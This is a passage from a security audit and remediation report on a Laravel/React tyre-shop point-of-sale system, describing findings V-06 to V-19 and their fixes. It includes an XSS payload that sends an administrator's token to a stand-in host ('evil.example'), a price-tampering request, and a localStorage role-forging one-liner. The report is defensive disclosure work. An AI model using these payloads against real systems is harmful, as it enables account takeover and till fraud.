Fixed: 8-hour expiry (one shop shift), configurable. Role-scoped abilities instead of ['*'] . Prior tokens revoked on login one person, one active session, which is right for a till and means a stolen token dies when the real user next signs in. Tokens revoked on deactivation, role change, username change and password change, each with an audit entry naming the reason. A new EnsureUserIsActive middleware re-checks on every request as a backstop for anything that flips

[P00248 | 18111:18212 | NORMAL_TEXT]
is_active without going through the controller. POST /logout-all for a user who suspects compromise.

[P00249 | 18212:18365 | NORMAL_TEXT]
A pubudupos_ token prefix was added so GitHub's secret scanning can recognise a leaked token  relevant for a project that had already committed a .env .

[P00250 | 18365:18415 | NORMAL_TEXT]
Verified:Token replayed after deactivation → 401.

[P00251 | 18415:18416 | HEADING_2]
⟦EMPTY PARAGRAPH⟧

[P00252 | 18416:18457 | HEADING_2]
V-07 · Error, source and log disclosure 

[P00253 | 18457:18505 | HEADING_2]
OWASP A05:2021 · CWE-209, CWE-538, CWE-552 High

[P00254 | 18505:18527 | NORMAL_TEXT]
Three separate paths.

[P00255 | 18527:18611 | NORMAL_TEXT]
1. Raw exception text returned regardless of APP_DEBUG at ten call sites. Observed:

[P00256 | 18611:18640 | NORMAL_TEXT]
GET /api/reports/carts → 500

[P00257 | 18640:18712 | NORMAL_TEXT]
{"message":"Class \"App\\Models\\Cart\" not found","exception":"Error",

[P00258 | 18712:18786 | NORMAL_TEXT]
 "file":"…\\app\\Http\\Controllers\\Api\\ReportController.php","line":23}

[P00259 | 18786:18898 | NORMAL_TEXT]
A PUT /customers/1 leaked the full SQL statement, database name, table and foreign-key constraint name. Notably

[P00260 | 18898:19024 | NORMAL_TEXT]
GrnController already gated its messages behind config('app.debug') the correct pattern was known and applied inconsistently.

[P00261 | 19024:19489 | NORMAL_TEXT | LIST id=kix.list.4 level=0]
The entire project directory served over HTTP. index.php and .htaccess were copied from public/ to the repository root so the app would run with the document root at the project root. The copy was verbatim, carrying no access rules and because the front-controller rewrite only fires for paths that do not exist ( RewriteCond %{REQUEST_FILENAME} !f ), every file that does exist was served as-is: /.env (DB password, APP_KEY , OneSignal REST key), /composer.lock ,

[P00262 | 19489:19622 | NORMAL_TEXT]
/storage/logs/laravel.log , /database/migrations/* , /app/** . APP_KEY alone signs and encrypts every Laravel cookie and signed URL.

[P00263 | 19622:19690 | NORMAL_TEXT | LIST id=kix.list.4 level=0]
Runtime logs committed to the repository, and downloadable per (2).

[P00264 | 19690:19789 | NORMAL_TEXT]
Two endpoints additionally returned 500 on every call, which is what made (1) trivially reachable:

[P00265 | 19789:19951 | NORMAL_TEXT]
ReportController::cartsReport referenced App\Models\Cart , a class that does not exist, and routes/api.php:161 pointed at a show() method that was never written.

[P00266 | 19951:20426 | NORMAL_TEXT]
Fix. A single uniform JSON error contract in Handler::render() , so an individual controller can no longer get it wrong: unexpected faults return a generic message plus a correlation UUID, with the full exception always logged and detail attached only when config('app.debug') is explicitly true. All ten ungated messages gated. The root .htaccess hardened to deny dotfiles, application directories, project metadata and source/data/log extensions  using mod_rewrite because

[P00267 | 20426:20834 | NORMAL_TEXT]
<Files> / <Directory> are frequently disabled in shared-hosting contexts. Logs removed from tracking, .gitignore extended. .env copy.example renamed to .env.example and hardened: it shipped APP_ENV=local and APP_DEBUG=true , which is exactly what Composer's post-root-package-install copies into .env automatically. The dead Cart report deleted; show() implemented; the written-but-unrouted cancel() routed.

[P00268 | 20834:20835 | HEADING_2]
⟦EMPTY PARAGRAPH⟧

[P00269 | 20835:20905 | HEADING_2]
V-08 · CORS accepted every origin & V-09 / V-18 · No security headers

[P00270 | 20905:20948 | NORMAL_TEXT]
OWASP A05:2021 · CWE-942, CWE-693 · Medium

[P00271 | 20948:21201 | NORMAL_TEXT]
config/cors.php:22 'allowed_origins' => ['*'] , confirmed: Origin: https://attacker.example.com → AccessControl-Allow-Origin: * . Combined with the unauthenticated /register (V-01), that alone was enough to create an admin account from a drive-by page.

[P00272 | 21201:21326 | NORMAL_TEXT]
Neither tier sent any security header: no CSP, no X-Frame-Options (clickjackable), no HSTS, no nosniff , no ReferrerPolicy .

[P00273 | 21326:21684 | NORMAL_TEXT]
Fix. CORS origins from an explicit FRONTEND_URLS allow-list with no wildcard fallback a missing environment variable must fail closed, not silently restore the vulnerability. A global SecurityHeaders middleware registered in the global stack rather than a route group, so 404s, 405s, throttle 429s and exception responses are covered too. A headers block in

[P00274 | 21684:21767 | NORMAL_TEXT]
vercel.json with a real CSP, which is also the defence-in-depth layer behind V-13.

[P00275 | 21767:21941 | NORMAL_TEXT]
HSTS is emitted only over TLS: RFC 6797 §7.2 forbids sending it over plain HTTP, and emitting it on a local dev server would pin developers' browsers to HTTPS for localhost.

[P00276 | 21941:22164 | NORMAL_TEXT]
Known limitation: style-src retains 'unsafe-inline' . Tailwind and the print templates emit inline style attributes, and removing it needs a nonce-based build pipeline. Residual risk is CSS injection, not script execution.

[P00277 | 22164:22165 | HEADING_2]
⟦EMPTY PARAGRAPH⟧

[P00278 | 22165:22252 | HEADING_2]
V-10 · The client dictated the selling price, and the discount workflow was decorative

[P00279 | 22252:22321 | NORMAL_TEXT]
OWASP A04:2021 Insecure Design / API6:2023 · CWE-602, CWE-807 · High

[P00280 | 22321:22566 | NORMAL_TEXT]
This is easy to misread as safe. The server [INLINE_OBJECT d.84]did compute the totals itself and did force inv_by from the token. But computing a correct total from attacker-supplied line prices is not server-side control it just launders the attacker's numbers.

[P00281 | 22566:22599 | NORMAL_TEXT]
Exploit. As an ordinary cashier:

[P00282 | 22599:22618 | NORMAL_TEXT]
POST /api/invoices

[P00283 | 22618:22684 | NORMAL_TEXT]
  items[0].selling_price = 1        (catalogue price: 32,000 LKR)

[P00284 | 22684:22733 | NORMAL_TEXT]
→ 201 Created, INV0003, net_total persisted as 1

[P00285 | 22733:22961 | NORMAL_TEXT]
The consequence is not merely underselling. The application has a complete discount-approval workflow: the cashier raises a DiscountRequest , an administrator reviews and approves or rejects it, a push notification is sent, and

[P00286 | 22961:23146 | NORMAL_TEXT]
DiscountRequestController::approve applies it. Every part of that was decorative. A cashier wanting 30,000 LKR off simply typed a lower selling_price , and no approval was ever sought.

[P00287 | 23146:23380 | NORMAL_TEXT]
Two ways to steal, both invisible in the books: sell at a private price to an accomplice, where the invoice, the stock movement and the profit report all agree with each other; or apply any discount with no approval record behind it.

[P00288 | 23380:23701 | NORMAL_TEXT]
Root cause. A trust boundary drawn in the wrong place. The design treats the till as part of the system rather than as a client. That is defensible for a cash drawer in a locked shop and indefensible for an HTTP API but the distinction is invisible unless someone asks "what if the request did not come from our own UI?"

[P00289 | 23701:23755 | NORMAL_TEXT]
Fix. store() restructured into resolve, then persist:

[P00290 | 23755:24026 | NORMAL_TEXT]
Products - price from the grn_items batches that FIFO actually allocates, quantity-weighted when one line spans several batches at different prices. Stock allocation therefore moves earlier in the method; it already ran inside one transaction, so atomicity is unchanged.

[P00291 | 24026:24128 | NORMAL_TEXT]
Services - from services.price , looked up by the id encoded in the line's product_code as SVC-<id> .

[P00292 | 24128:24247 | NORMAL_TEXT]
Discounts - require an approved, unconsumed DiscountRequest raised by the same cashier, capped at the approved amount.

[P00293 | 24247:24562 | NORMAL_TEXT]
The client's submitted price is treated as advisory and a mismatch is rejected with a 422 naming the line, not silently corrected. Silent correction would let a cashier hand the customer a receipt showing one figure while the books recorded another, and would hide genuine drift between the till and the catalogue.

[P00294 | 24562:25056 | NORMAL_TEXT]
Frontend defence in depth. buildInvoicePayload() now sends only the operator's choices and the expected catalogue quote. It deliberately omits total_amount , net_total , balances, credit allocation and inv_by ; those are server-derived from locked records and the authenticated token. This does not replace server validation - DevTools can still add fields - but it prevents the normal UI from pretending to author values the server must own. Four Vitest regression tests assert that boundary.

[P00295 | 25056:25353 | NORMAL_TEXT]
Approvals were made single-use ( consumed_at , consumed_inv_no ). Without that, one approval for "Rs 2,000 off a Michelin tyre" could be replayed on every later sale of that product, forever. It also gives auditors a direct link from a discounted line back to the administrator who authorised it.

[P00296 | 25353:25557 | NORMAL_TEXT]
Verified. Price tamper → 422, no stock consumed. Correct price → 201. Unapproved discount → 422. Approved discount → accepted and consumed. Replay → 422. Over-cap → 422. Another cashier's approval → 422.

[P00297 | 25557:25588 | HEADING_2]
V-11 · No security audit trail

[P00298 | 25588:25631 | NORMAL_TEXT]
OWASP A09:2021 · CWE-778, CWE-532 · Medium

[P00299 | 25631:25747 | NORMAL_TEXT]
The application recorded nothing that would let an incident be reconstructed. Failed logins were not logged at all.

[P00300 | 25747:25889 | NORMAL_TEXT]
AuthController:73 wrote a line only when login threw, so a wrong password produced no record and the 20-attempt spray in V-05b left no trace.

[P00301 | 25889:26185 | NORMAL_TEXT]
Worse, invoice cancellation actively destroyed the evidence: update():446-487 overwrites total_amount , net_total and every line's selling_price with 0 in place. After cancelling there was no way to distinguish a voided 500,000 LKR sale from a voided 500 LKR one, and no record of who voided it.

[P00302 | 26185:26369 | NORMAL_TEXT]
This matters because cancelling an invoice is the classic way theft is concealed in a POS: take the cash, void the sale, and the stock returns to the shelf as though nothing happened.

[P00303 | 26369:26488 | NORMAL_TEXT]
Fix. An audit_logs table recording action, severity, actor, subject, a before/after JSON diff, and request provenance.

[P00304 | 26488:26601 | NORMAL_TEXT]
AuditLog is append-only in code: performUpdate() and delete() throw  because an audit trail an attacker can edit

[P00305 | 26601:27030 | NORMAL_TEXT]
is not an audit trail. A single AuditLogger writes every event twice: to the table (queryable) and to a separate security log channel with 90-day retention (shippable to a SIEM, and the copy that survives if the database is what was compromised). Its level is pinned to info independently of LOG_LEVEL , because the hardened .env.example sets LOG_LEVEL=warning in production and would otherwise discard successful-login records.

[P00306 | 27030:27270 | NORMAL_TEXT]
Failures are swallowed after being reported  a business operation must never fail because its audit row could not be written, or the audit system becomes a denial-of-service vector. Secrets are redacted at any nesting depth before writing.

[P00307 | 27270:27435 | NORMAL_TEXT]
GET /api/audit-logs (admin-only, read-only) makes the trail reviewable: recording the event satisfies half the control, detecting the incident needs the other half.

[P00308 | 27435:27436 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00309 | 27436:27478 | HEADING_2]
V-12 · Vulnerable and outdated components

[P00310 | 27478:27520 | NORMAL_TEXT]
OWASP A06:2021 · CWE-1104, CWE-937 · High

[P00311 | 27520:27752 | NORMAL_TEXT]
Backend — 41 advisories across 13 packages (12 high, 24 medium, 4 low): guzzle (9), psr7 (4), commonmark (12), laravel/framework (3), symfony/mime, routing, yaml, mailer, process, http-foundation, polyfill-intl-idn, phpunit, psysh.

[P00312 | 27752:27964 | NORMAL_TEXT]
Root cause: laravel/framework pinned to ^10.10 . Laravel 10's security support ended 2025-02-04 and the project ran on PHP ^8.1 , whose support ended 2025-12-31. Both framework and runtime were past end of life.

[P00313 | 27964:28070 | NORMAL_TEXT]
This turned out not to be a theoretical concern. Composer now refuses to install any 10.x release at all:

[P00314 | 28070:28072 | NORMAL_TEXT]
[INLINE_OBJECT d.105]

[P00315 | 28072:28245 | NORMAL_TEXT]
There is therefore no "pin to the latest 10.x patch" option. Our plan had listed the major upgrade as deferred; the evidence made it mandatory, and we promoted it to a fix.

[P00316 | 28245:28463 | NORMAL_TEXT]
Upgraded to Laravel 12.69.2 with Sanctum 4.3.3, PHP floor ^8.2 , PHPUnit 11. Compatibility was checked first: no migration uses ->change() (which needed Doctrine DBAL, removed in 11), the classic bootstrap/app.php and

[P00317 | 28463:28760 | NORMAL_TEXT]
Kernel.php structure that Laravel 12 still supports for upgraded applications is retained, and no removed helper is referenced. One change was required. Sanctum 4 no longer auto-loads its personal_access_tokens migration, so it is now published into the application; without it every login fails.

[P00318 | 28760:28843 | NORMAL_TEXT]
Frontend: 23 advisories (2 critical, 14 high). Two were reachable from user input:

[P00319 | 28843:28844 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00320 | 28844:28951 | NORMAL_TEXT]
xlsx@0.18.5 : CVE-2023-30533 (prototype pollution in sheet_to_json ) and CVE-2024-22363 (ReDoS). Reachable

[P00321 | 28951:29211 | NORMAL_TEXT]
via GrnAdjust.jsx:1222 , which validates nothing before calling XLSX.read() . npm audit fix cannot resolve this: SheetJS no longer publishes to npm, so the registry's newest version is the vulnerable one. Repointed to the vendor's own distribution at 0.20.3 .

[P00322 | 29211:29328 | NORMAL_TEXT]
[jspdf@3.0.4](mailto:jspdf@3.0.4) :  10 advisories rated critical including PDF injection allowing arbitrary JavaScript. Reachable because

[P00323 | 29328:29561 | NORMAL_TEXT]
every exported PDF is built from unescaped server strings (V-13). Upgraded to ^4.2.1 after confirming jspdfautotable@5 already declares peerDependencies {"jspdf":"^2 || ^3 || ^4"} and that only APIs stable across the major are used.

[P00324 | 29561:29721 | NORMAL_TEXT]
Verified. composer audit → No security vulnerability advisories found (41 → 0). npm audit → found 0 vulnerabilities (23 → 0). Both suites and both builds pass.

[P00325 | 29721:29722 | HEADING_2]
⟦EMPTY PARAGRAPH⟧

[P00326 | 29722:29791 | HEADING_2]
V-13 · Stored XSS in the receipt printer → administrator token theft

[P00327 | 29791:29847 | NORMAL_TEXT]
OWASP A03:2021 Injection · CWE-79 · CVSS 8.8 · Critical

[P00328 | 29847:30041 | NORMAL_TEXT]
Evidence. There was no HTML escaping anywhere in the frontend. A repository-wide search for escapeHtml|sanitiz|DOMPurify over src/ returned one hit, and it was an unrelated encodeURIComponent .

[P00329 | 30041:30159 | NORMAL_TEXT]
React escapes everything it renders, so the JSX was never the problem. Receipts and reports are not rendered by React

[P00330 | 30159:30327 | NORMAL_TEXT]
they are assembled as template strings and handed to document.write() in a new window, at seven call sites including CreateInvoice.jsx:1751 and SalesHistory.jsx:1011 .

[P00331 | 30327:30493 | NORMAL_TEXT]
Those templates interpolated server data raw: customer name, customer phone, cashier name, department name and address, product name, and the free-text invoice note.

[P00332 | 30493:30495 | NORMAL_TEXT]
[INLINE_OBJECT d.118]

[P00333 | 30495:30574 | NORMAL_TEXT]
Exploit chain. A cashier saves a customer named or types into an invoice note:

[P00334 | 30574:30653 | NORMAL_TEXT]
<img src=x onerror="fetch('https://evil.example/?t='+localStorage.authToken)">

[P00335 | 30653:30955 | NORMAL_TEXT]
Nothing happens at that point. The payload fires when an administrator later prints that invoice from Sales History. It executes in a same-origin window and exfiltrates the admin's bearer token, which the application kept in localStorage where script can read it (V-16) and which never expired (V-06).

[P00336 | 30955:31170 | NORMAL_TEXT]
Stored XSS to full administrator account takeover, triggered by a routine business action, requiring only the ability to type a customer's name. Product names imported from a spreadsheet (V-17) reach the same sink.

[P00337 | 31170:31478 | NORMAL_TEXT]
Root cause. A rendering path that bypasses the framework's protection. The team's mental model was "React escapes for us" — correct for 23 of 24 pages, and wrong for the one that builds HTML by hand. The no-op sanitiser suggests the escaping once existed and was lost in a refactor with nothing to catch it.

[P00338 | 31478:31483 | NORMAL_TEXT]
Fix.

[P00339 | 31483:31755 | NORMAL_TEXT | LIST id=kix.list.1 level=0]
src/lib/escapeHtml.js , escaping all five significant characters rather than the usual three — " and ' matter because these templates interpolate into quoted attributes, where escaping only < , > and & still allows an attacker to close the quote and add an event handler.

[P00340 | 31755:31954 | NORMAL_TEXT | LIST id=kix.list.1 level=0]
Applied where API data enters each template rather than at each of the dozen ${...} sites, so there is one line per value to review instead of twelve — which is how the originals ended up with none.

[P00341 | 31954:32033 | NORMAL_TEXT | LIST id=kix.list.1 level=0]
cleanProductName restored: it now strips the parenthesised suffix and escapes.

[P00342 | 32033:32215 | NORMAL_TEXT | LIST id=kix.list.1 level=0]
A lint gate, so this cannot return. eslint.security.config.js forbids document.write , innerHTML , outerHTML , insertAdjacentHTML , dangerouslySetInnerHTML , eval and new Function .

[P00343 | 32218:32327 | NORMAL_TEXT | TABLE row=0 col=0]
A detail worth recording. The obvious ESLint rule does not work here. no-restricted-properties with {object:

[P00344 | 32327:32545 | NORMAL_TEXT | TABLE row=0 col=0]
'document', property: 'write'} only matches the bare identifier document . Every call site in this application is printWindow.document.write(...) , where the object is the member expression printWindow.document so the

[P00345 | 32545:32745 | NORMAL_TEXT | TABLE row=0 col=0]
obvious rule silently matched none of the seven. The gate uses a custom AST selector instead. A security control that appears to work and does not is worse than none, because it stops anyone looking.

[P00346 | 32746:32747 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00347 | 32747:32865 | NORMAL_TEXT]
Verified. 15 regression tests. The central one parses the escaped payload with jsdom and asserts the browser sees one

[P00348 | 32865:32867 | NORMAL_TEXT]
[INLINE_OBJECT d.126]

[P00349 | 32867:32868 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00350 | 32868:32870 | NORMAL_TEXT]
[INLINE_OBJECT d.127]

[P00351 | 32870:32889 | NORMAL_TEXT]
warned afterwards.

[P00352 | 32889:33203 | NORMAL_TEXT]
The file exposed the production API hostname and, in commented-out lines, an otherwise-undisclosed staging backend. Neither is a credential, so this is not the worst possible outcome but the pattern is what makes it serious: the file a developer will eventually put a real key into was being committed by default.

[P00353 | 33203:33527 | NORMAL_TEXT]
Fix. git rm --cached .env ; .gitignore extended with .env , .env.* , !.env.example . A documented .env.example added, stating plainly that anything prefixed VITE_ is inlined into the public JavaScript bundle the non-obvious part, and how a developer who treats .env as private storage publishes an API key to every visitor.

[P00354 | 33527:33713 | NORMAL_TEXT]
The CI secret-scan job asserts the .gitignore rule exists, not merely that the file is currently absent. Checking only the current state would pass again the moment someone re-added it.

[P00355 | 33713:33769 | NORMAL_TEXT]
Not fully fixed: NF-5. The hostnames remain in history.

[P00356 | 33769:33818 | HEADING_2]
V-15 · Bearer tokens proxied over plaintext HTTP

[P00357 | 33818:33850 | NORMAL_TEXT]
OWASP A02:2021 · CWE-319 · High

[P00358 | 33850:33961 | NORMAL_TEXT]
vercel.json:5 rewrote /api/:path* to http:// pubudutyres.codexpress.codes , while .env:1 used https:// for the

[P00359 | 33961:34239 | NORMAL_TEXT]
same host — a downgrade, not a host lacking TLS. Every proxied request carries Authorization: Bearer <token> , so tokens, customer phone numbers and cost prices travelled one hop unencrypted. Because tokens never expired (V-06), a token captured once stayed valid indefinitely.

[P00360 | 34239:34240 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00361 | 34240:34242 | NORMAL_TEXT]
[INLINE_OBJECT d.132]

[P00362 | 34242:34243 | HEADING_2]
⟦EMPTY PARAGRAPH⟧

[P00363 | 34243:34306 | HEADING_2]
V-16 · Token in localStorage; role trusted from client storage

[P00364 | 34306:34358 | NORMAL_TEXT]
OWASP A07:2021 / A01:2021 · CWE-522, CWE-603 · High

[P00365 | 34358:34381 | NORMAL_TEXT]
Three related defects.

[P00366 | 34381:34565 | NORMAL_TEXT | LIST id=kix.list.5 level=0]
The token and full user record lived in localStorage  readable by any script on the origin, not scoped to a tab, surviving browser close. This is the storage that V-13's payload read.

[P00367 | 34565:34678 | NORMAL_TEXT | LIST id=kix.list.5 level=0]
role was read back out of that writable storage and used for access control ( App.jsx:50 , lib/auth.js:15 ), and

[P00368 | 34678:34862 | NORMAL_TEXT]
AuthContext.jsx:27-46 restored the session with no server call at all. Typing localStorage.setItem('user', JSON.stringify({role:'admin'})) and reloading produced the administrator UI.

[P00369 | 34862:35179 | NORMAL_TEXT]
Worse, the financial data was already in the response and merely hidden  Reports.jsx:337,420,518,… conditionally render cost and margin columns, so an employee saw them in DevTools regardless. And /sales/profit was missing adminOnly entirely while the sidebar showed "Profit" only to admins, so it looked restricted.

[P00370 | 35179:35380 | NORMAL_TEXT | LIST id=kix.list.5 level=0]
Logout cleared only two keys, leaving invoice drafts with customer PII, grn_report_data containing wholesale cost prices, and the cached service catalogue behind for the next cashier on a shared till.

[P00371 | 35380:35847 | NORMAL_TEXT]
Fix. The token now lives in a module-scoped variable ordinary memory, not enumerable, gone when the tab closes with a per-tab sessionStorage mirror so a refresh does not sign the cashier out mid-sale. AuthContext calls GET /me on boot and uses the response as the authority on identity and role; on failure it explicitly does not fall back to the cached record. clearAllAppStorage() clears the token, the user cache, both legacy keys and the five business-data keys.

[P00372 | 35847:35961 | NORMAL_TEXT]
adminOnly added to /sales/profit . Cost and margin reporting moved behind admin middleware server-side (V-02), so

[P00373 | 35961:36173 | NORMAL_TEXT]
the figures no longer reach an employee's browser at all. The dead duplicate src/services/api.js which imported from a module that does not exist and read a divergent auth_token key logout never cleared deleted.

[P00374 | 36173:36174 | HEADING_2]
⟦EMPTY PARAGRAPH⟧

[P00375 | 36174:36175 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00376 | 36175:36176 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00377 | 36176:36177 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00378 | 36177:36178 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00379 | 36178:36179 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00380 | 36179:36180 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00381 | 36180:36181 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00382 | 36181:36182 | HEADING_2]
⟦EMPTY PARAGRAPH⟧

[P00383 | 36182:36237 | HEADING_2]
V-17 · Unvalidated uploads reached a vulnerable parser

[P00384 | 36237:36241 | NORMAL_TEXT]
   

[P00385 | 36241:36243 | NORMAL_TEXT]
[INLINE_OBJECT d.142]

[P00386 | 36243:36244 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00387 | 36244:36366 | NORMAL_TEXT]
Fix. A shared validator applied to all four paths: presence, 10 MB cap, extension allow-list, MIME check, and magic bytes

[P00388 | 36366:36484 | NORMAL_TEXT]
the only check an attacker cannot rename their way past, and why the function is async. .xlsx must start 50 4B (ZIP),

[P00389 | 36484:36605 | NORMAL_TEXT]
.xls D0 CF 11 E0 A1 B1 1A E1 (OLE2) or ZIP, .csv must contain no NUL in its first bytes. A 5,000-row cap before mapping.

[P00390 | 36605:36606 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00391 | 36606:36667 | HEADING_2]
V-18 · Wholesale cost and margin disclosed to every employee

[P00392 | 36667:36790 | NORMAL_TEXT]
OWASP A01:2021 Broken Access Control · OWASP API3:2023 Broken Object Property Level Authorization · CWE213, CWE-200 · High

[P00393 | 36790:37222 | NORMAL_TEXT]
The front end hid supplier cost and margin columns from an employee, but the API sent the numbers anyway. With an ordinary cashier token, all five endpoints needed for stock lookup returned confidential fields: GET /grns , /grns/stock , /grns/product/{code}/batches , /grns/{id} and /grns/code/{grnCode} . The responses exposed stock_price , actual_cost , main_branch_price , supplier discount levels, total_cost and total_profit .

[P00394 | 37222:37618 | NORMAL_TEXT]
This is not a display bug. A cashier can open the browser Network tab and read exactly what the shop pays for each tyre, calculate the margin, and disclose supplier terms to a competitor. V-02 had already restricted the profit reports to administrators; these operational stock APIs remain legitimately reachable by cashiers, so the property-level policy must be enforced in the response itself.

[P00395 | 37618:38170 | NORMAL_TEXT]
Fix. HidesCostFromEmployees applies a model-level default deny list to Grn and GrnItem . Cost, discount and margin attributes are hidden on every serialization unless revealCostTo() receives an administrator. The two endpoints that construct response arrays manually use the same single costFieldsVisibleTo() decision, returning only availability, selling price and final customer price to employees. This is intentionally fail-safe: a future endpoint that serializes either model omits supplier terms unless an administrator is explicitly authorized.

[P00396 | 38170:38587 | NORMAL_TEXT]
Verified. The runtime PoC calls each of the five endpoints as a cashier and finds none of eleven confidential field names; each response remains HTTP 200 and retains selling_price . The same script confirms an administrator still sees cost fields. ResponseFilteringTest adds 16 regression tests covering all five endpoints, the safe model default, null-user failclosed behaviour, and legitimate administrator access.

[P00397 | 38587:38588 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00398 | 38588:38589 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00399 | 38589:38590 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00400 | 38590:38629 | HEADING_1]
5. Supporting defects fixed in passing

[P00401 | 38629:38630 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00402 | 38630:38732 | NORMAL_TEXT]
Not headline vulnerabilities, but each one blocked reproducible provisioning or masked a real defect.

[P00403 | 38732:38915 | NORMAL_TEXT]
V-19a : The application could not be installed from source. Three migrations created personal_access_tokens : Sanctum's own (auto-loaded) plus two byte-identical application copies. 

[P00404 | 38915:39049 | NORMAL_TEXT]
Any clean php artisan migrate aborted with error 1050. Invisible to the original team because their database predated the duplicates.

[P00405 | 39049:39250 | NORMAL_TEXT]
V-19b : Two audit tables could never be created. grn_adjustment_histories.adjusted_by and return_to_stock.returned_by were declared NOT NULL and then given ON DELETE SET NULL foreign keys, which MySQL

[P00406 | 39250:39272 | NORMAL_TEXT]
refuses (errno 150). 

[P00407 | 39272:39474 | NORMAL_TEXT]
These are the audit tables, and nullOnDelete() is the deliberate choice to keep history after a staff member is deleted so on any rebuilt environment the stock-adjustment audit trail was simply absent.

[P00408 | 39474:39658 | NORMAL_TEXT]
V-19c : Validation and storage disagreed. users.phone_no_02 is NOT NULL while every validation rule calls it nullable , so creating a user without a second phone number returned 500. 

[P00409 | 39658:39854 | NORMAL_TEXT]
Found by our own test suite. It matters because before V-07 that raw SQLSTATE reached the caller, and because creating staff accounts is now the only way in since public registration was removed.

[P00410 | 39854:39951 | NORMAL_TEXT]
V-19d : Validation failures masked as server errors. Eleven catch (\Exception) clauses swallowed

[P00411 | 39951:40074 | NORMAL_TEXT]
ValidationException , returning 500 instead of 422 and hiding input-validation problems from clients and monitoring alike.

[P00412 | 40074:40282 | NORMAL_TEXT]
V-19e : Tests ran against the live database. phpunit.xml had both DB_ lines commented out, so php artisan test ran against whatever .env pointed at. Any test using RefreshDatabase would have been translated.

[P00413 | 40282:40283 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00414 | 40283:40284 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00415 | 40284:40285 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00416 | 40285:40286 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00417 | 40286:40331 | HEADING_1]
6. OAuth 2.0 / OpenID Connect implementation

[P00418 | 40331:40332 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00419 | 40332:40370 | HEADING_2]
6.1 What it does and why this feature

[P00420 | 40370:40371 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00421 | 40371:40497 | NORMAL_TEXT]
We implemented Google OpenID Connect sign-in using the Authorization Code flow with PKCE, applied to the staff login feature.

[P00422 | 40497:40621 | NORMAL_TEXT]
It is the deliberate replacement for the public self-registration removed in V-01, and the two halves reinforce each other:

[P00423 | 40621:40622 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00424 | 40625:40626 | NORMAL_TEXT | TABLE row=0 col=0]
⟦EMPTY PARAGRAPH⟧

[P00425 | 40627:40636 | NORMAL_TEXT | TABLE row=0 col=1]
Identity

[P00426 | 40637:40651 | NORMAL_TEXT | TABLE row=0 col=2]
Authorization

[P00427 | 40653:40660 | NORMAL_TEXT | TABLE row=1 col=0]
Before

[P00428 | 40661:40706 | NORMAL_TEXT | TABLE row=1 col=1]
self-asserted -anyone could POST role: admin

[P00429 | 40707:40712 | NORMAL_TEXT | TABLE row=1 col=2]
none

[P00430 | 40714:40720 | NORMAL_TEXT | TABLE row=2 col=0]
After

[P00431 | 40721:40740 | NORMAL_TEXT | TABLE row=2 col=1]
asserted by Google

[P00432 | 40741:40767 | NORMAL_TEXT | TABLE row=2 col=2]
granted by the shop owner

[P00433 | 40768:40769 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00434 | 40769:40969 | NORMAL_TEXT]
An administrator creates the staff account and records the work email. The employee proves they control that mailbox by signing in with Google. Two different parties are involved, which is the point.

[P00435 | 40969:41170 | NORMAL_TEXT]
It also raises the floor under administrator accounts: an admin signing in with Google is protected by whatever 2FA is on that Google account the nearest thing to MFA this project delivers (see NF-3).

[P00436 | 41170:41222 | HEADING_2]
6.2 Why Authorization Code + PKCE, and not Implicit

[P00437 | 41222:41223 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00438 | 41223:41426 | NORMAL_TEXT]
The Implicit grant returns the access token in the URL fragment, where it lands in browser history, in Referer headers and in any logging proxy on the path. OAuth 2.1 removes it for exactly that reason.

[P00439 | 41426:41655 | NORMAL_TEXT]
The Authorization Code flow returns a short-lived, single-use code instead, and PKCE (RFC 7636) binds that code to the browser that began the flow: an attacker who intercepts the code cannot redeem it without the code_verifier .

[P00440 | 41655:41916 | NORMAL_TEXT]
We apply PKCE even though this is a confidential client holding a client secret, because the secret protects the backend's identity, not the code in transit. S256 only  a plain challenge is the verifier, so anyone who sees the authorize request already has it.

[P00441 | 41916:41917 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00442 | 41917:41918 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00443 | 41918:41919 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00444 | 41919:41920 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00445 | 41920:41921 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00446 | 41921:41922 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00447 | 41922:41923 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00448 | 41923:41924 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00449 | 41924:41937 | HEADING_2]
6.3 The flow

[P00450 | 41937:41938 | NORMAL_TEXT]
⟦EMPTY PARAGRAPH⟧

[P00451 | 41938:41940 | NORMAL_TEXT]
[INLINE_OBJECT d.159]

